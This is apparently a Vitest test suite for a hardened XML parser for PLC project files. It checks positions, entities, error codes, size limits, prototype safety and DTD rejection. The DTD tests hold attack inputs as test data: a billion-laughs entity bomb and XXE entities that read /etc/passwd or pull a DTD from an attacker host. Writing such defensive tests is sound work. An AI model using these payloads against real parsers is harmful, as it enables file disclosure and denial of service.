import { describe, expect, it } from 'vitest'
import { DEFAULT_XML_LIMITS, ProjectParseError } from '../../src/adapters/types.ts'
import type { XmlLimits } from '../../src/adapters/types.ts'
import { parseXml } from '../../src/xml/index.ts'

function errorOf(fn: () => unknown): ProjectParseError {
  try {
    fn()
  } catch (e) {
    if (e instanceof ProjectParseError) return e
    throw new Error(`expected ProjectParseError, got ${String(e)}`, { cause: e })
  }
  throw new Error('expected an error, but parsing succeeded')
}

function codeOf(text: string, limits?: Partial<XmlLimits>): string {
  return errorOf(() => parseXml(text, limits)).code
}

describe('parseXml: tree building', () => {
  it('builds elements, attributes, text and children', () => {
    const root = parseXml('<?xml version="1.0" encoding="UTF-8"?>\n<a x="1" y=\'two\'><b>hello</b><c/>tail</a>')
    expect(root.name).toBe('a')
    expect({ ...root.attrs }).toEqual({ x: '1', y: 'two' })
    expect(root.children.map((c) => c.name)).toEqual(['b', 'c'])
    expect(root.children[0]?.text).toBe('hello')
    expect(root.children[1]?.text).toBe('')
    expect(root.text).toBe('tail')
  })

  it('keeps text of an element only, not descendants', () => {
    const root = parseXml('<a>one<b>inner</b>two</a>')
    expect(root.text).toBe('onetwo')
    expect(root.children[0]?.text).toBe('inner')
  })

  it('accepts a BOM, comments, processing instructions and whitespace around the root', () => {
    const bom = String.fromCodePoint(0xfeff)
    const root = parseXml(`${bom}<?xml version="1.0"?>\n<!-- c1 -->\n<?app data?>\n<a><!-- inside --><b/></a>\n<!-- after -->\n<?after x?>\n`)
    expect(root.name).toBe('a')
    expect(root.children).toHaveLength(1)
  })

  it('accepts names with dots, dashes, colons and non-ASCII letters', () => {
    const root = parseXml('<x:a-b.c_d é="1"><Ünï/></x:a-b.c_d>')
    expect(root.name).toBe('x:a-b.c_d')
    expect(root.attrs['é']).toBe('1')
    expect(root.children[0]?.name).toBe('Ünï')
  })

  it('allows whitespace around "=" and before ">" and "/>"', () => {
    const root = parseXml('<a  x = "1"\n\ty\t=\t\'2\' ><b  /></a >')
    expect({ ...root.attrs }).toEqual({ x: '1', y: '2' })
    expect(root.children[0]?.name).toBe('b')
  })
})

describe('parseXml: positions and paths', () => {
  const doc = [
    '<?xml version="1.0"?>',
    '<RSLogix5000Content>',
    '  <Controller Name="PS">',
    '    <Programs>',
    '      <Program Name="Safety">',
    '        <Routines>',
    '          <Routine Name="ESD">',
    '            <RLLContent>',
    '              <Rung Number="0"><Text>A</Text></Rung>',
    '              <Rung Number="2"><Text>B</Text></Rung>',
    '            </RLLContent>',
    '          </Routine>',
    '        </Routines>',
    '      </Program>',
    '    </Programs>',
    '    <Data/><Data/><Single/>',
    '  </Controller>',
    '</RSLogix5000Content>',
  ].join('\n')

  it('records 1-based line and column of each "<"', () => {
    const root = parseXml(doc)
    expect([root.line, root.column]).toEqual([2, 1])
    const controller = root.children[0]
    expect([controller?.line, controller?.column]).toEqual([3, 3])
    const rung2 = controller?.children[0]?.children[0]?.children[0]?.children[0]?.children[0]?.children[1]
    expect(rung2?.name).toBe('Rung')
    expect([rung2?.line, rung2?.column]).toEqual([10, 15])
  })

  it('counts CRLF line breaks as one line', () => {
    const root = parseXml('<a>\r\n<b/>\r\n\r\n<c/></a>')
    expect(root.children.map((c) => [c.line, c.column])).toEqual([
      [2, 1],
      [4, 1],
    ])
  })

  it('builds XPath-like paths using Name, then Number, then position', () => {
    const root = parseXml(doc)
    const rung = root.children[0]?.children[0]?.children[0]?.children[0]?.children[0]?.children[0]?.children[1]
    expect(rung?.path).toBe(
      "/RSLogix5000Content/Controller[@Name='PS']/Programs/Program[@Name='Safety']/Routines/Routine[@Name='ESD']/RLLContent/Rung[@Number='2']",
    )
    const tail = root.children[0]?.children.slice(1) ?? []
    expect(tail.map((e) => e.path)).toEqual([
      "/RSLogix5000Content/Controller[@Name='PS']/Data[1]",
      "/RSLogix5000Content/Controller[@Name='PS']/Data[2]",
      "/RSLogix5000Content/Controller[@Name='PS']/Single",
    ])
  })

  it('escapes quotes in path predicates', () => {
    const root = parseXml(`<a><b Name="it's &quot;x&quot;"/></a>`)
    expect(root.children[0]?.path).toBe(`/a/b[@Name='it''s "x"']`)
  })

  it('builds friendly locations with sibling indexes and named ancestors', () => {
    const root = parseXml(doc)
    const rung = root.children[0]?.children[0]?.children[0]?.children[0]?.children[0]?.children[0]?.children[1]
    expect(rung?.location).toBe('Controller.Programs.Program[0].Routines.Routine[0].RLLContent.Rung[1] (Program "Safety", Routine "ESD", Rung 2)')
    expect(root.children[0]?.children[2]?.location).toBe('Controller.Data[1]')
    expect(root.location).toBe('RSLogix5000Content')
  })

  it('strips invisible characters from locations and paths', () => {
    const rlo = String.fromCodePoint(0x202e)
    const root = parseXml(`<r><c><Tags><Tag Name="Pump${rlo}_01"/></Tags></c></r>`)
    const tag = root.children[0]?.children[0]?.children[0]
    expect(tag?.location).toBe('c.Tags.Tag[0] (Tag "Pump_01")')
    expect(tag?.path).toBe("/r/c/Tags/Tag[@Name='Pump_01']")
    expect(tag?.attrs['Name']).toBe(`Pump${rlo}_01`) // the data itself is untouched; the adapter cleans and warns
  })
})

describe('parseXml: character data', () => {
  it('reads CDATA, including "]]" and "]" inside it', () => {
    const root = parseXml('<a><![CDATA[[1,0]]]]><![CDATA[x]]y]]></a>')
    expect(root.text).toBe('[1,0]]x]]y')
  })

  it('does not decode entities or markup inside CDATA', () => {
    const root = parseXml('<a><![CDATA[<b>&amp;&unknown;</b>]]></a>')
    expect(root.text).toBe('<b>&amp;&unknown;</b>')
  })

  it('concatenates text and CDATA in document order', () => {
    expect(parseXml('<a>x<![CDATA[y]]>z</a>').text).toBe('xyz')
  })

  it('decodes the five predefined entities in text and attributes', () => {
    const root = parseXml('<a v="&lt;&gt;&amp;&quot;&apos;">&lt;&gt;&amp;&quot;&apos;</a>')
    expect(root.text).toBe(`<>&"'`)
    expect(root.attrs['v']).toBe(`<>&"'`)
  })

  it('decodes decimal and hex character references, including astral code points', () => {
    const root = parseXml('<a v="&#65;&#x42;">&#x1F600;&#128512;&#x0041;&#000066;&#xe9;</a>')
    expect(root.attrs['v']).toBe('AB')
    expect(root.text).toBe(String.fromCodePoint(0x1f600, 0x1f600, 0x41, 0x42, 0xe9))
  })

  it('normalizes CRLF and CR to LF in text and CDATA, but keeps &#13;', () => {
    expect(parseXml('<a>x\r\ny\rz<![CDATA[\r\n]]>&#13;</a>').text).toBe('x\ny\nz\n\r')
  })

  it('normalizes literal tabs and newlines in attribute values to spaces, keeping character references', () => {
    expect(parseXml('<a v="x\ty\r\nz&#10;"/>').attrs['v']).toBe('x y z\n')
  })

  it('accepts ">" in text and the other quote inside an attribute value', () => {
    const root = parseXml(`<a d='say "hi"' s="it's">a > b</a>`)
    expect(root.attrs['d']).toBe('say "hi"')
    expect(root.attrs['s']).toBe("it's")
    expect(root.text).toBe('a > b')
  })
})

describe('parseXml: prototype safety', () => {
  it('stores __proto__ and constructor attributes as inert data', () => {
    const root = parseXml('<a __proto__="polluted" constructor="c" toString="t" hasOwnProperty="h"/>')
    expect(Object.getPrototypeOf(root.attrs)).toBeNull()
    expect(root.attrs['__proto__']).toBe('polluted')
    expect(root.attrs['constructor']).toBe('c')
    expect(Object.keys(root.attrs)).toEqual(['__proto__', 'constructor', 'toString', 'hasOwnProperty'])
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined()
    expect(Object.prototype).not.toHaveProperty('polluted')
  })

  it('does not treat inherited names as duplicates', () => {
    const root = parseXml('<a toString="1" valueOf="2"/>')
    expect(root.attrs['toString']).toBe('1')
  })

  it('detects a duplicated __proto__ attribute', () => {
    expect(codeOf('<a __proto__="1" __proto__="2"/>')).toBe('XML_DUPLICATE_ATTRIBUTE')
  })
})

describe('parseXml: DTDs are rejected outright', () => {
  it('rejects the billion-laughs entity expansion bomb before expanding anything', () => {
    let ents = '<!ENTITY lol "lol">'
    for (let i = 1; i <= 9; i++) ents += `<!ENTITY lol${i} "${`&lol${i === 1 ? '' : i - 1};`.repeat(10)}">`
    const doc = `<?xml version="1.0"?><!DOCTYPE lolz [${ents}]><lolz>&lol9;</lolz>`
    const err = errorOf(() => parseXml(doc))
    expect(err.code).toBe('XML_DOCTYPE_FORBIDDEN')
    expect(err.source).toEqual({ path: '/', line: 1, column: 22 })
  })

  it('rejects external entities (XXE) and parameter entities', () => {
    expect(codeOf('<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>')).toBe('XML_DOCTYPE_FORBIDDEN')
    expect(codeOf('<!DOCTYPE a [<!ENTITY % p SYSTEM "http://attacker.invalid/x.dtd"> %p;]><a/>')).toBe('XML_DOCTYPE_FORBIDDEN')
    expect(codeOf('<!DOCTYPE a SYSTEM "http://attacker.invalid/x.dtd"><a/>')).toBe('XML_DOCTYPE_FORBIDDEN')
  })

  it('rejects a DOCTYPE in any letter case and anywhere in the document', () => {
    expect(codeOf('<!doctype a><a/>')).toBe('XML_DOCTYPE_FORBIDDEN')
    expect(codeOf('<a><!DOCTYPE a></a>')).toBe('XML_DOCTYPE_FORBIDDEN')
  })

  it('rejects stray markup declarations', () => {
    expect(codeOf('<a><!ENTITY x "y"></a>')).toBe('XML_INVALID_MARKUP')
    expect(codeOf('<a><!ELEMENT a ANY></a>')).toBe('XML_INVALID_MARKUP')
  })
})

describe('parseXml: error codes', () => {
  const cases: [string, string, string][] = [
    ['empty document', '', 'XML_NO_ROOT'],
    ['whitespace only', '  \n\t ', 'XML_NO_ROOT'],
    ['only a comment', '<!-- nothing -->', 'XML_NO_ROOT'],
    ['not XML at all', 'PK\u0003\u0004 binary', 'XML_NOT_XML'],
    ['plain text', 'hello world', 'XML_NOT_XML'],
    ['NUL character', '<a>x\u0000y</a>', 'XML_NUL_CHARACTER'],
    ['mismatched tags', '<a><b></a></b>', 'XML_MISMATCHED_TAG'],
    ['unclosed root', '<a><b></b>', 'XML_UNCLOSED_TAG'],
    ['unclosed child', '<a><b>', 'XML_UNCLOSED_TAG'],
    ['stray close tag', '<a></a></b>', 'XML_UNEXPECTED_CLOSE_TAG'],
    ['text after root', '<a/>trailing', 'XML_TEXT_OUTSIDE_ROOT'],
    ['text before root', '<!-- x -->text<a/>', 'XML_TEXT_OUTSIDE_ROOT'],
    ['CDATA outside root', '<a/><![CDATA[x]]>', 'XML_TEXT_OUTSIDE_ROOT'],
    ['multiple roots', '<a/><b/>', 'XML_MULTIPLE_ROOTS'],
    ['multiple roots after close', '<a></a>\n<a></a>', 'XML_MULTIPLE_ROOTS'],
    ['duplicate attribute', '<a x="1" x="2"/>', 'XML_DUPLICATE_ATTRIBUTE'],
    ['< in attribute value', '<a x="1<2"/>', 'XML_LT_IN_ATTRIBUTE'],
    ['invalid element name', '<1a/>', 'XML_INVALID_NAME'],
    ['space after <', '< a/>', 'XML_INVALID_NAME'],
    ['invalid attribute name', '<a -x="1"/>', 'XML_INVALID_NAME'],
    ['invalid name char', '<a"b/>', 'XML_MALFORMED_TAG'],
    ['attributes not separated', '<a x="1"y="2"/>', 'XML_MALFORMED_TAG'],
    ['attribute without value', '<a x/>', 'XML_MALFORMED_TAG'],
    ['unquoted attribute value', '<a x=1/>', 'XML_MALFORMED_TAG'],
    ['stray slash in tag', '<a / x="1">', 'XML_MALFORMED_TAG'],
    ['junk in close tag', '<a></a x>', 'XML_MALFORMED_TAG'],
    ['unterminated attribute value', '<a x="1/>', 'XML_UNTERMINATED_STRING'],
    ['unterminated start tag', '<a x="1"', 'XML_UNTERMINATED_TAG'],
    ['unterminated close tag', '<a></a', 'XML_UNTERMINATED_TAG'],
    ['lone < at end', '<a>x<', 'XML_UNTERMINATED_TAG'],
    ['unterminated comment', '<a><!-- x</a>', 'XML_UNTERMINATED_COMMENT'],
    ['unterminated CDATA', '<a><![CDATA[x</a>', 'XML_UNTERMINATED_CDATA'],
    ['unterminated PI', '<a><?pi x</a>', 'XML_UNTERMINATED_PI'],
    ['misplaced declaration', '<a/><?xml version="1.0"?>', 'XML_MISPLACED_DECLARATION'],
    ['declaration after comment', '<!-- c --><?xml version="1.0"?><a/>', 'XML_MISPLACED_DECLARATION'],
    ['unknown entity', '<a>&nbsp;</a>', 'XML_UNKNOWN_ENTITY'],
    ['unknown entity in attribute', '<a x="&xxe;"/>', 'XML_UNKNOWN_ENTITY'],
    ['bare ampersand', '<a>fish & chips</a>', 'XML_MALFORMED_ENTITY'],
    ['unterminated reference', '<a>&amp</a>', 'XML_MALFORMED_ENTITY'],
    ['empty reference', '<a>&;</a>', 'XML_MALFORMED_ENTITY'],
    ['empty char ref', '<a>&#;</a>', 'XML_MALFORMED_ENTITY'],
    ['empty hex char ref', '<a>&#x;</a>', 'XML_MALFORMED_ENTITY'],
    ['uppercase X in hex ref', '<a>&#X41;</a>', 'XML_MALFORMED_ENTITY'],
    ['non-digit in char ref', '<a>&#12a;</a>', 'XML_MALFORMED_ENTITY'],
    ['NUL char ref', '<a>&#0;</a>', 'XML_INVALID_CHAR_REF'],
    ['control char ref', '<a>&#x1;</a>', 'XML_INVALID_CHAR_REF'],
    ['surrogate char ref', '<a>&#xD800;</a>', 'XML_INVALID_CHAR_REF'],
    ['low surrogate char ref', '<a>&#57343;</a>', 'XML_INVALID_CHAR_REF'],
    ['U+FFFE char ref', '<a>&#xFFFE;</a>', 'XML_INVALID_CHAR_REF'],
    ['char ref above U+10FFFF', '<a>&#x110000;</a>', 'XML_INVALID_CHAR_REF'],
    ['huge decimal char ref', '<a>&#99999999999999999999;</a>', 'XML_INVALID_CHAR_REF'],
  ]
  it.each(cases)('%s', (_label, input, code) => {
    expect(codeOf(input)).toBe(code)
  })

  it('every error is a ProjectParseError with a message, location and source position', () => {
    for (const [, input] of cases) {
      const err = errorOf(() => parseXml(input))
      expect(err).toBeInstanceOf(ProjectParseError)
      expect(err.message.length).toBeGreaterThan(10)
      expect(err.location).toBeTypeOf('string')
      expect(err.source?.line).toBeGreaterThanOrEqual(1)
      expect(err.source?.column).toBeGreaterThanOrEqual(1)
    }
  })

  it('reports precise positions', () => {
    const err = errorOf(() => parseXml('<a>\n  <b>\n    <c></b>\n</a>'))
    expect(err.code).toBe('XML_MISMATCHED_TAG')
    expect(err.source).toEqual({ path: '/a/b/c', line: 3, column: 8 })
    expect(err.message).toContain('expected </c> (opened at line 3, column 5) but found </b>')
    expect(err.message).toContain('(line 3, column 8)')
  })

  it('names the failing element in the location, e.g. Controller.Tags.Tag[27] (Tag "...")', () => {
    const tags: string[] = []
    for (let i = 0; i < 27; i++) tags.push(`<Tag Name="T_${i}" DataType="BOOL"/>`)
    tags.push('<Tag Name="Pump_01_Run_Enable" DataType="BOOL" DataType="DINT"/>')
    const doc = `<RSLogix5000Content><Controller Name="PS"><Tags>\n${tags.join('\n')}\n</Tags></Controller></RSLogix5000Content>`
    const err = errorOf(() => parseXml(doc))
    expect(err.code).toBe('XML_DUPLICATE_ATTRIBUTE')
    expect(err.location).toBe('Controller.Tags.Tag[27] (Tag "Pump_01_Run_Enable")')
    expect(err.source?.line).toBe(29)
  })

  it('uses the open element as location for errors in content', () => {
    const err = errorOf(() => parseXml('<RSLogix5000Content><Controller><Programs><Program Name="Safety"><Description>&bogus;</Description></Program></Programs></Controller></RSLogix5000Content>'))
    expect(err.code).toBe('XML_UNKNOWN_ENTITY')
    expect(err.location).toBe('Controller.Programs.Program[0].Description (Program "Safety")')
  })

  it('keeps hostile names out of messages unescaped and bounded', () => {
    const long = 'x'.repeat(5000)
    const err = errorOf(() => parseXml(`<a><${long}></a>`))
    expect(err.code).toBe('XML_MISMATCHED_TAG')
    expect(err.message.length).toBeLessThan(400)
  })
})

describe('parseXml: limits', () => {
  it('enforces maxChars', () => {
    expect(codeOf('<a>0123456789</a>', { maxChars: 10 })).toBe('XML_TOO_LARGE')
    expect(parseXml('<a>01234</a>', { maxChars: 12 }).text).toBe('01234')
  })

  it('enforces maxDepth', () => {
    expect(codeOf('<a><b><c/></b></a>', { maxDepth: 2 })).toBe('XML_TOO_DEEP')
    expect(parseXml('<a><b><c/></b></a>', { maxDepth: 3 }).name).toBe('a')
  })

  it('enforces maxElements', () => {
    expect(codeOf('<a><b/><b/><b/></a>', { maxElements: 3 })).toBe('XML_TOO_MANY_ELEMENTS')
    expect(parseXml('<a><b/><b/><b/></a>', { maxElements: 4 }).children).toHaveLength(3)
  })

  it('enforces maxAttributesPerElement', () => {
    expect(codeOf('<a x="1" y="2" z="3"/>', { maxAttributesPerElement: 2 })).toBe('XML_TOO_MANY_ATTRIBUTES')
    expect(Object.keys(parseXml('<a x="1" y="2"/>', { maxAttributesPerElement: 2 }).attrs)).toHaveLength(2)
  })

  it('enforces maxAttributeValueLength', () => {
    expect(codeOf('<a x="12345"/>', { maxAttributeValueLength: 4 })).toBe('XML_ATTRIBUTE_TOO_LONG')
    expect(parseXml('<a x="1234"/>', { maxAttributeValueLength: 4 }).attrs['x']).toBe('1234')
  })

  it('enforces maxTextLength across text and CDATA segments of one element', () => {
    expect(codeOf('<a>12345</a>', { maxTextLength: 4 })).toBe('XML_TEXT_TOO_LONG')
    expect(codeOf('<a>12<![CDATA[345]]></a>', { maxTextLength: 4 })).toBe('XML_TEXT_TOO_LONG')
    expect(parseXml('<a>12<b>34</b>56</a>', { maxTextLength: 4 }).text).toBe('1256')
  })

  it('ignores nonsensical limit overrides and keeps defaults', () => {
    const root = parseXml('<a/>', { maxDepth: Number.NaN, maxChars: -1 } as Partial<XmlLimits>)
    expect(root.name).toBe('a')
    expect(DEFAULT_XML_LIMITS.maxDepth).toBe(64)
  })

  it('rejects 100k levels of nesting with XML_TOO_DEEP instead of overflowing the stack', () => {
    const depth = 100_000
    const doc = '<a>'.repeat(depth) + '</a>'.repeat(depth)
    expect(codeOf(doc)).toBe('XML_TOO_DEEP')
  })

  it('is iterative: 100k levels parse when the depth limit allows it', () => {
    const depth = 100_000
    const doc = '<a>'.repeat(depth) + 'x' + '</a>'.repeat(depth)
    let el = parseXml(doc, { maxDepth: depth + 1 })
    let levels = 1
    while (el.children[0] !== undefined) {
      el = el.children[0]
      levels++
    }
    expect(levels).toBe(depth)
    expect(el.text).toBe('x')
  })

  it('handles pathological inputs in linear time', () => {
    const n = 200_000
    const inputs = [
      '<a>' + '&'.repeat(n) + '</a>',
      '<a>' + '&#'.repeat(n) + '</a>',
      '<a x="' + 'y'.repeat(n),
      '<a>' + '<!--'.repeat(n),
      '<a>' + ']]>'.repeat(n) + '</a>',
      '<a ' + Array.from({ length: 60 }, (_, i) => `b${i}="${'v'.repeat(1000)}" `).join('') + '>' + '<'.repeat(n),
      '<a>' + '<b>'.repeat(60) + 'x'.repeat(n),
      '<a>' + '<b x="1">'.repeat(60) + '</b>'.repeat(60) + '</a>'.repeat(n),
      '<a>' + '\n'.repeat(n) + '&bad;</a>',
    ]
    const t0 = performance.now()
    for (const input of inputs) {
      try {
        parseXml(input)
      } catch (e) {
        expect(e).toBeInstanceOf(ProjectParseError)
      }
    }
    expect(performance.now() - t0).toBeLessThan(2000)
  })
})
